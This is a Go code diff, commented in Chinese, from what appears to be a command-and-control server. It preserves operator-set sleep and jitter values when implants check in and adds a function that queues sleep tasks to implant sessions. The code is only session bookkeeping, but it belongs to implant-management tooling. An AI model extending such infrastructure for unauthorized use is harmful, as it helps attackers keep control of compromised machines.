@@ -381,8 +381,10 @@ func (m *Manager) IngestCheckIn(listenerID string, req ImplantCheckInRequest) (*
 		Metadata:      req.Metadata,
 	}
 	if existing != nil {
-		// 保留原 ID/FirstSeenAt/Note，避免被覆盖
+		// 保留原 ID/FirstSeenAt/Note 与操作员设置的 sleep/jitter，避免被 beacon 心跳上报覆盖
 		session.FirstSeenAt = existing.FirstSeenAt
+		session.SleepSeconds = existing.SleepSeconds
+		session.JitterPercent = existing.JitterPercent
 		if session.Note == "" {
 			session.Note = existing.Note
 		}
@@ -411,6 +413,44 @@ func (m *Manager) IngestCheckIn(listenerID string, req ImplantCheckInRequest) (*
 	// 普通心跳：last_check_in 已由 UpsertC2Session 写入 c2_sessions，不再落 c2_events。
 	// 否则按 sleep 周期每条心跳一条审计，库表与 SSE 会被迅速撑爆；上线/掉线等仍照常 publishEvent。
 	return session, nil
+}
+
+// SetSessionSleep 更新会话期望的心跳间隔，并向植入体下发 sleep 任务以尽快生效。
+func (m *Manager) SetSessionSleep(sessionID string, sleepSeconds, jitterPercent int) (*database.C2Task, error) {
+	if strings.TrimSpace(sessionID) == "" {
+		return nil, ErrInvalidInput
+	}
+	if sleepSeconds < 1 {
+		sleepSeconds = 1
+	}
+	if jitterPercent < 0 {
+		jitterPercent = 0
+	}
+	if jitterPercent > 100 {
+		jitterPercent = 100
+	}
+	if err := m.db.SetC2SessionSleep(sessionID, sleepSeconds, jitterPercent); err != nil {
+		return nil, err
+	}
+	task, err := m.EnqueueTask(EnqueueTaskInput{
+		SessionID: sessionID,
+		TaskType:  TaskTypeSleep,
+		Payload: map[string]interface{}{
+			"seconds": sleepSeconds,
+			"jitter":  jitterPercent,
+		},
+		Source: "manual",
+	})
+	if err != nil {
+		m.logger.Warn("sleep 任务入队失败", zap.Error(err), zap.String("session_id", sessionID))
+	}
+	m.publishEvent("info", "session", sessionID, "",
+		fmt.Sprintf("Sleep 已更新: %ds (抖动 %d%%)", sleepSeconds, jitterPercent),
+		map[string]interface{}{
+			"sleep_seconds":  sleepSeconds,
+			"jitter_percent": jitterPercent,
+		})
+	return task, nil
 }
 
 // MarkSessionDead 心跳超时检测器调用：标记会话为 dead
